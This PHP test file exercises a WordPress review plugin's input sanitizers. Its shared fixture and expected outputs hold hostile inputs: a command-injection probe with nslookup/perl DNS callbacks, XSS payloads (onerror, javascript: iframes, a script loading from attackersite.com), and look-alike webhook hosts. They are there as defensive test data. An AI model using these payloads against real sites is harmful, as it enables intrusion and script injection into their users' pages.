<?php

use GeminiLabs\SiteReviews\Modules\Sanitizer;

use function GeminiLabs\SiteReviews\Tests\createPosts;
use function GeminiLabs\SiteReviews\Tests\createTerms;
use function GeminiLabs\SiteReviews\Tests\createUserAndGet;
use function GeminiLabs\SiteReviews\Tests\createUsers;

uses()->group('plugin');

test('sanitize array consolidate', function () {
    $sanitized = sanitizeValues('array-consolidate');
    expect($sanitized)->toBe([
        [],
        [],
        ['1'],
        ['a' => false],
        [13],
        [0],
        ['1' => 13],
        ['b' => true],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
    ]);
});

test('sanitize array int', function () {
    $sanitized = sanitizeValues('array-int');
    expect($sanitized)->toBe([
        [],
        [],
        [1],
        [],
        [13],
        [],
        [13],
        [],
        [],
        [],
        [],
        [],
        [],
        [1989],
        [],
        [],
        [2020],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
    ]);
});

test('sanitize array string', function () {
    $sanitized = sanitizeValues('array-string');
    expect($sanitized)->toBe([
        [],
        ['abc'],
        ['1'],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [''],
        ['This is a title!'],
        [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
        ['June 13', '1989'],
        ['03-12-2020'],
        ['0-0-2020'],
        ['2020'],
        ['李祖阳 xx xx'],
        ['#ax+dex(tomorrow) $200 200% @peter'],
        ['this is true'],
        ['single-review full-width" "alert(69)'],
        ['matt@wordpress.org'],
        ['https//wordpress.org'],
        ['wordpress.org'],
        ['www.wordpress.org'],
        ['https://wordpress.org'],
        ['-1'],
        ['Hello this is a link and a link'],
        [''],
        [''],
        [''],
        [''],
        [''],
        [''],
        [''],
        [''],
    ]);
});

test('sanitize attr', function () {
    $sanitized = sanitizeValues('attr');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '&lt;script&gt;var x = 23;&lt;/script&gt;',
        "&lt;h3&gt;This is a\n title!&lt;/h3&gt;",
        ';(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(&#039;hissstgxwgukmocpc5c80.me&#039;))',
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width&quot; onmouseover=&quot;alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        '-1',
        '&lt;div&gt;&lt;span&gt;&lt;a id=&quot;xxx&quot; href=&quot;https://apple.com&quot; title=&quot;hello&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;/a&gt; this is &lt;em&gt;a link&lt;/em&gt; and a &lt;strong&gt;link&lt;/strong&gt;&lt;/span&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;',
        '&lt;img sr&lt;img src=&quot;x&quot;&gt;c=x onerror=alert(55)&gt;',
        '&lt;script sr&lt;img src=&quot;x&quot;&gt;c=https://attackersite.com/test.js&gt;',
        '&lt;img src=x alert(55)&gt;',
        '&amp;lt;script src=https://attackersite.com/test.js&amp;gt;',
        '&amp;lt;iframe src=javascript:alert(1)&amp;gt;',
        '&lt;noscript&gt; &amp;lt;p title=&quot; &lt;/noscript&gt;&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;',
        '&amp;amp;amp;amp;amp;amp;amp;amp;lt;img src ooooonerror=nerror=nerror=nerror=nerror=alert(/XSS-Img/)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
        '&amp;amp;amp;amp;amp;amp;amp;amp;lt;iframe src=javascript:alert(/XSS-iFrame)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
    ]);
});

test('sanitize attr class', function () {
    $sanitized = sanitizeValues('attr-class');
    expect($sanitized)->toBe([
        '',
        'abc',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'script scriptvar x',
        'a h3This is titleh3',
        '-e gethostbynamehissstgxwgukmocpc5c80me hit-gx_wgukmocpc5c8ddddcomperl nslookup',
        'June',
        '-12-2020',
        '-0-2020',
        '',
        'xx',
        'axdextomorrow peter',
        'is this true',
        'full-width onmouseoveralert69 single-review',
        'mattwordpressorg',
        'httpswordpressorg',
        'wordpressorg',
        'wwwwordpressorg',
        'https:wordpressorg',
        '-1',
        'a and divspana ema hrefhttps:applecom idxxx is linkem stronglinkstrongspandivulliliul target_blankspanHellospana this titlehello',
        'img onerroralert55 srcxcx srimg',
        'script srcxchttps:attackersitecomtestjs srimg',
        'alert55gt ltimg srcx',
        'ampltscript srchttps:attackersitecomtestjsampgt',
        'ampltiframe srcjavascript:alert1ampgt',
        'alertdocumentdomainquotgt allcolorall:allf78fb3all ampltp ltnoscriptgtltstyle ltstylegt noscript onload title',
        'ampampampampampampampampltimg ooooonerrornerrornerrornerrornerroralertXSS-Imgampampampampampampampampgt src',
        'ampampampampampampampampltiframe srcjavascript:alertXSS-iFrameampampampampampampampampgt',
    ]);
});

test('sanitize attr style', function () {
    $values = sanitizerTestValues();
    $values[] = 'background-image: url(https://apple.com/image.jpg);';
    $values[] = 'color:red';
    $values[] = 'color:red;';
    $values[] = 'color: red; margin:0';
    $values[] = 'color: #000';
    $values[] = 'color: #000;margin';
    $values[] = 'color: #000 !important;';
    $sanitized = sanitizeValues('attr-style', $values);
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'background-image:url(https://apple.com/image.jpg);',
        'color:red;',
        'color:red;',
        'color:red;margin:0;',
        'color:#000;',
        'color:#000;',
        'color:#000 !important;',
    ]);
});

test('sanitize color', function () {
    $values = sanitizerTestValues();
    $values[] = '#';
    $values[] = '#1';
    $values[] = '#11';
    $values[] = '#111';
    $values[] = 'rgb()';
    $values[] = 'rgb(0 0 0)';
    $values[] = 'rgb(0,0,0)';
    $values[] = 'rgba(0,0,0)';
    $values[] = 'rgba(0,0,0,99)';
    $values[] = 'rgba(0 0 0 / .2)';
    $values[] = 'rgba(0,0,0,1)';
    $sanitized = sanitizeValues('color', $values);
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '#111',
        '',
        '',
        'rgb(0,0,0)',
        '',
        '',
        '',
        'rgba(0,0,0,1)',
    ]);
});

test('sanitize date', function () {
    $sanitized = sanitizeValues('date');
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '1989-06-13 00:00:00',
        '2020-12-03 00:00:00',
        '2019-11-30 00:00:00',
        wp_date('Y-m-d H:i:s', strtotime('2020')),
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        wp_date('Y-m-d H:i:s', strtotime('-1')),
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
    $sanitized = sanitizeValues('date:Y-m-d');
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '1989-06-13',
        '2020-12-03',
        '2019-11-30',
        wp_date('Y-m-d', strtotime('2020')),
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        wp_date('Y-m-d', strtotime('-1')),
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize email', function () {
    $sanitized = sanitizeValues('email');
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'matt@wordpress.org',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize id', function () {
    $sanitized = sanitizeValues('id');
    expect($sanitized)->toBe([
        '',
        'abc',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'thisisatitle',
        'nslookuphit-gx_wgukmocpc5c8ddddc',
        'june131989',
        '-12-2020',
        '-0-2020',
        '',
        'xxxx',
        'axdextomorrow200200peter',
        'thisistrue',
        'single-reviewfull-widthalert69',
        'mattwordpressorg',
        'httpswordpressorg',
        'wordpressorg',
        'wwwwordpressorg',
        'httpswordpressorg',
        '-1',
        'hellothisisalinkandalink',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize id unique', function () {
    $sanitized = glsr(Sanitizer::class)->sanitizeIdUnique('', 'form_');
    expect($sanitized)->toMatch('/form_([a-z0-9]{8})/');
    $sanitized = sanitizeValues('id-unique');
    $pattern = '/glsr_([a-z0-9]{8})/';
    expect($sanitized[0])->toMatch($pattern);
    expect($sanitized[1])->toBe('abc');
    expect($sanitized[2])->toMatch($pattern);
    expect($sanitized[3])->toMatch($pattern);
    expect($sanitized[4])->toMatch($pattern);
    expect($sanitized[5])->toMatch($pattern);
    expect($sanitized[6])->toMatch($pattern);
    expect($sanitized[7])->toMatch($pattern);
    expect($sanitized[8])->toMatch($pattern);
    expect($sanitized[9])->toMatch($pattern);
    expect($sanitized[10])->toMatch($pattern);
    expect($sanitized[11])->toBe('thisisatitle');
    expect($sanitized[12])->toBe('nslookuphit-gx_wgukmocpc5c8ddddc');
    expect($sanitized[13])->toBe('june131989');
    expect($sanitized[14])->toBe('-12-2020');
    expect($sanitized[15])->toBe('-0-2020');
    expect($sanitized[16])->toMatch($pattern);
    expect($sanitized[17])->toBe('xxxx');
    expect($sanitized[18])->toBe('axdextomorrow200200peter');
    expect($sanitized[19])->toBe('thisistrue');
    expect($sanitized[20])->toBe('single-reviewfull-widthalert69');
    expect($sanitized[21])->toBe('mattwordpressorg');
    expect($sanitized[22])->toBe('httpswordpressorg');
    expect($sanitized[23])->toBe('wordpressorg');
    expect($sanitized[24])->toBe('wwwwordpressorg');
    expect($sanitized[25])->toBe('httpswordpressorg');
    expect($sanitized[26])->toBe('-1');
    expect($sanitized[27])->toBe('hellothisisalinkandalink');
    expect($sanitized[28])->toMatch($pattern);
    expect($sanitized[29])->toMatch($pattern);
    expect($sanitized[30])->toMatch($pattern);
    expect($sanitized[31])->toMatch($pattern);
    expect($sanitized[32])->toMatch($pattern);
    expect($sanitized[33])->toMatch($pattern);
    expect($sanitized[34])->toMatch($pattern);
    expect($sanitized[35])->toMatch($pattern);
});

test('sanitize ip address', function () {
    $values = sanitizerTestValues();
    $values[] = '127*';
    $values[] = '127.*';
    $values[] = '127.0.*';
    $values[] = '127.0.0.*';
    $values[] = '127.0.0.1';
    $values[] = '103.21.244.0/22';
    $values[] = '2400:cb00';
    $values[] = '2400:cb00::';
    $values[] = '2400:cb00::/32';
    $sanitized = sanitizeValues('ip-address', $values);
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '127.0.0.1',
        '',
        '',
        '2400:cb00::',
        '',
    ]);
});

test('sanitize json', function () {
    $sanitized = sanitizeValues('json');
    expect($sanitized)->toBe([
        [],
        [],
        ['1'],
        ['a' => false],
        [13],
        [0],
        [1 => 13],
        ['b' => true],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
    ]);
});

test('sanitize key', function () {
    $sanitized = sanitizeValues('key');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        'thisisatitle',
        'nslookuphit_gx_wgukmocpc5c8ddddc',
        'june131989',
        '03_12_2020',
        '0_0_2020',
        '2020',
        'xxxx',
        'axdextomorrow200200peter',
        'thisistrue',
        'single_reviewfull_widthalert69',
        'mattwordpressorg',
        'httpswordpressorg',
        'wordpressorg',
        'wwwwordpressorg',
        'httpswordpressorg',
        '_1',
        'hellothisisalinkandalink',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize max', function () {
    $sanitized = sanitizeValues('max:21');
    expect($sanitized)->toBe([
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        21,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        -1,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ]);
});

test('sanitize min', function () {
    $sanitized = sanitizeValues('min:13');
    expect($sanitized)->toBe([
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        2020,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
        13,
    ]);
});

test('sanitize min max', function () {
    $sanitized = sanitizeValues('min:3|max:50');
    expect($sanitized)->toBe([
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        50,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
        3,
    ]);
});

test('sanitize name', function () {
    $sanitized = sanitizeValues('name');
    expect($sanitized)->toBe([
        '',
        'abc',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'thisisatitle',
        'nslookuphit-gx_wgukmocpccddddcomperl-egethostbynamehissstgxwgukmocpccme',
        'june',
        '',
        '',
        '',
        'xxxx',
        'axdextomorrowpeter',
        'thisistrue',
        'single-reviewfull-widthalert',
        'mattwordpressorg',
        'httpswordpressorg',
        'wordpressorg',
        'wwwwordpressorg',
        'httpswordpressorg',
        '',
        'hellothisisalinkandalink',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize numeric', function () {
    $sanitized = sanitizeValues('numeric');
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '2020',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '-1',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize post ids', function () {
    // The shared corpus is the wrong input for this sanitizer: it contains ['1'], and whether that
    // sanitizes to [1] or [] depends on whether post ID 1 exists — which it does on a real install
    // (Hello world). So this test states its own inputs, each with a single right answer.
    $posts = createPosts(2);
    $sanitized = sanitizeValues('post-ids', [
        '',                                   // nothing
        'abc',                                // not an id
        '<script>var x = 23;</script>',       // junk
        $posts[0],                            // a single id
        $posts,                               // an array of ids
        implode(',', $posts),                 // a comma-separated list of ids
        [999999001, 999999002, 999999003],    // ids that cannot exist
        [$posts[0], $posts[0], $posts[1]],    // duplicates are collapsed
    ]);
    expect($sanitized)->toBe([
        [],
        [],
        [],
        [$posts[0]],
        $posts,
        $posts,
        [],
        $posts,
    ]);
});

test('sanitize rating', function () {
    add_filter('site-reviews/const/MAX_RATING', fn () => 5);
    add_filter('site-reviews/const/MIN_RATING', '__return_zero');
    $sanitized = sanitizeValues('rating');
    expect($sanitized)->toBe([
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        5,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ]);
});

test('sanitize regex', function () {
    $sanitized = sanitizeValues('regex');
    expect(array_filter($sanitized))->toBe([]);
    $sanitized = sanitizeValues('regex:/[^\w\-]/');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        'scriptvarx23script',
        'h3Thisisatitleh3',
        'nslookuphit-gx_wgukmocpc5c8ddddcomperl-egethostbynamehissstgxwgukmocpc5c80me',
        'June131989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        'xxxx',
        'axdextomorrow200200peter',
        'thisistrue',
        'single-reviewfull-widthonmouseoveralert69',
        'mattwordpressorg',
        'httpswordpressorg',
        'wordpressorg',
        'wwwwordpressorg',
        'httpswordpressorg',
        '-1',
        'divspanaidxxxhrefhttpsapplecomtitlehellotarget_blankspanHellospanathisisemalinkemandastronglinkstrongspandivulliliul',
        'imgsrimgsrcxcxonerroralert55',
        'scriptsrimgsrcxchttpsattackersitecomtestjs',
        'ltimgsrcxalert55gt',
        'ampltscriptsrchttpsattackersitecomtestjsampgt',
        'ampltiframesrcjavascriptalert1ampgt',
        'noscriptampltptitleltnoscriptgtltstyleonloadalertdocumentdomainquotgtallcolorallallf78fb3allltstylegt',
        'ampampampampampampampampltimgsrcooooonerrornerrornerrornerrornerroralertXSS-Imgampampampampampampampampgt',
        'ampampampampampampampampltiframesrcjavascriptalertXSS-iFrameampampampampampampampampgt',
    ]);
});

test('sanitize slug', function () {
    $sanitized = sanitizeValues('slug');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        'this-is-a-title',
        'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
        'june-13-1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '%e6%9d%8e%e7%a5%96%e9%98%b3-xx-xx',
        'axdextomorrow-200-200-peter',
        'this-is-true',
        'single-review-full-width-alert69',
        'mattwordpress-org',
        'https-wordpress-org',
        'wordpress-org',
        'www-wordpress-org',
        'https-wordpress-org',
        '1',
        'hello-this-is-a-link-and-a-link',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize term ids', function () {
    // A term id survives only if it is one of the plugin's own categories. Everything
    // else — a string, an email, a rating, a term id belonging to somebody else's
    // taxonomy — comes back as nothing.
    //
    // The expectation is COMPUTED rather than written out, and that is not fussiness.
    // The shared fixture contains [13] and ['1' => 13], and this test used to assert
    // that neither of them was a category. Term ids come from an AUTO_INCREMENT, and a
    // rolled-back transaction does not rewind it — so which ids createTerms() hands out
    // below depends on the history of the database the suite is run against, and on
    // some of them it hands out 13. Written out by hand, the assertion was not "13 is
    // not a category of ours", it was "this database has been used enough".
    $isCategory = fn ($termId) => !empty(term_exists((int) $termId, glsr()->taxonomy));

    $terms = createTerms(2, ['taxonomy' => glsr()->taxonomy]);
    $strangers = array_values(array_diff([1, 2, 3, 4, 5, 6, 7, 8, 9], $terms));

    $values = sanitizerTestValues();
    $values[] = $terms[0];
    $values[] = $terms;
    $values[] = implode(',', $terms);
    $values[] = $strangers;

    $expected = array_fill(0, count(sanitizerTestValues()), []);
    $expected[4] = $isCategory(13) ? [13] : []; // the fixture's [13]
    $expected[6] = $isCategory(13) ? [13] : []; // the fixture's ['1' => 13]
    $expected[] = [$terms[0]];                  // one id
    $expected[] = $terms;                       // several
    $expected[] = $terms;                       // several, comma separated
    $expected[] = array_values(array_filter($strangers, $isCategory));

    expect(sanitizeValues('term-ids', $values))->toBe($expected);
});

test('sanitize text', function () {
    $sanitized = sanitizeValues('text');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        'This is a title!',
        ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width" "alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        '-1',
        'Hello this is a link and a link',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize text html', function () {
    $sanitized = sanitizeValues('text-html');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        'var x = 23;',
        "This is a\n title!",
        ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width" "alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        '-1',
        '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is <em>a link</em> and a <strong>link</strong>',
        '',
        '',
        '',
        '',
        '',
        ' &lt;p title=&quot;  *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} ',
        '',
        '',
    ]);
    $sanitized = sanitizeValues('text-html:a,img');
    expect($sanitized[27])->toBe('<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is a link and a link');
    expect($sanitized[28])->toBe('&lt;img sr<img src="x">c=x alert(55)&gt;');
    expect($sanitized[29])->toBe('&lt;script sr<img src="x">c=https://attackersite.com/test.js&gt;');
});

test('sanitize text multiline', function () {
    $sanitized = sanitizeValues('text-multiline');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        "This is a\n title!",
        ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width" "alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        '-1',
        'Hello this is a link and a link',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
});

test('sanitize text post', function () {
    $sanitized = sanitizeValues('text-post');
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        'var x = 23;',
        "<h3>This is a\n title!</h3>",
        ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(\'hissstgxwgukmocpc5c80.me\'))",
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width\" \"alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        '-1',
        '<div><span><a id=\"xxx\" href=\"https://apple.com\" title=\"hello\" target=\"_blank\"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
        '&lt;img sr<img src=\"x\">c=x alert(55)&gt;',
        '&lt;script sr<img src=\"x\">c=https://attackersite.com/test.js&gt;',
        '<img src=\"x\">',
        '',
        '',
        ' &lt;p title=&quot;  *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} ',
        '<img src>',
        '',
    ]);
});

test('sanitize url', function () {
    $sanitized = sanitizeValues('url');
    expect($sanitized)->toBe([
        '',
        'https://abc',
        'https://1',
        '',
        'https://13',
        'https://0',
        'https://13',
        '',
        'https://1',
        '',
        '',
        '',
        '',
        '',
        'https://03-12-2020',
        'https://0-0-2020',
        'https://2020',
        '',
        '',
        '',
        '',
        'https://matt@wordpress.org',
        'https://https//wordpress.org',
        'https://wordpress.org',
        'https://www.wordpress.org',
        'https://wordpress.org',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
    ]);
    // test with a url prefix arg (without scheme)
    $values = [
        'https://discord.com/invite/123',
        'https://wordpress.org',
        'discord.com/invite/456',
        'http://discord.com/server',
        'https://notdiscord.com',
        '',
    ];
    $sanitized = sanitizeValues('url:discord.com', $values);
    expect($sanitized)->toBe([
        'https://discord.com/invite/123',
        '',
        'https://discord.com/invite/456',
        'http://discord.com/server',
        '',
        '',
    ]);
    // test with a url prefix arg (with scheme)
    $sanitized = sanitizeValues('url:https://discord.com', $values);
    expect($sanitized)->toBe([
        'https://discord.com/invite/123',
        '',
        'https://discord.com/invite/456',
        'http://discord.com/server',
        '',
        '',
    ]);
});

test('sanitize url host is anchored', function () {
    // The domain arg must match on the URL host, not a raw string prefix,
    // so look-alike hosts that merely contain the allowed domain are rejected.
    $values = [
        'https://hooks.slack.com/services/T00/B00/xYz',   // exact host: allowed
        'https://ptb.discord.com/api/webhooks/1/x',        // subdomain of allowed: allowed
        'https://hooks.slack.com.evil.com/services/x',     // suffix look-alike: rejected
        'https://evil.com/hooks.slack.com/x',              // allowed domain only in path: rejected
        'https://hooks.slack.com@evil.com/x',              // allowed domain only in userinfo: rejected
        'https://hooks.slack.company.com/x',               // prefix substring, no dot boundary: rejected
    ];
    $sanitized = sanitizeValues('url:hooks.slack.com', $values);
    expect($sanitized)->toBe([ 'https://hooks.slack.com/services/T00/B00/xYz', '', '', '', '', '', ]);
    $sanitized = sanitizeValues('url:discord.com', ['https://ptb.discord.com/api/webhooks/1/x']);
    expect($sanitized)->toBe(['https://ptb.discord.com/api/webhooks/1/x']);
});

test('sanitize user email', function () {
    $user = createUserAndGet();
    wp_set_current_user($user->ID);
    $values = sanitizerTestValues();
    $values[] = $user->user_email;
    $sanitized = sanitizeValues('user-email', $values);
    expect($sanitized)->toBe([
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        'matt@wordpress.org',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        $user->user_email,
    ]);
    $sanitized = sanitizeValues('user-email:current_user', $values);
    expect($sanitized)->toBe([
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        'matt@wordpress.org',
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
        $user->user_email,
    ]);
});

test('sanitize user id', function () {
    $user1 = createUserAndGet();
    $user2 = createUserAndGet();
    $values = sanitizerTestValues();
    $values[] = $user1->ID; // test User ID value
    $values[] = $user1->user_login; // test User login value
    $values[] = 'user_id'; // Test current User ID value
    $sanitized = sanitizeValues('user-id', $values);
    expect($sanitized)->toBe([
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        $user1->ID,
        $user1->ID,
        0,
    ]);
    $sanitized = sanitizeValues("user-id:{$user2->ID}", $values);
    expect($sanitized)->toBe([
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user2->ID,
        $user1->ID,
        $user1->ID,
        $user2->ID,
    ]);
    wp_set_current_user($user1->ID);
    $sanitized = sanitizeValues('user-id:current_user', $values);
    expect($sanitized)->toBe([
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
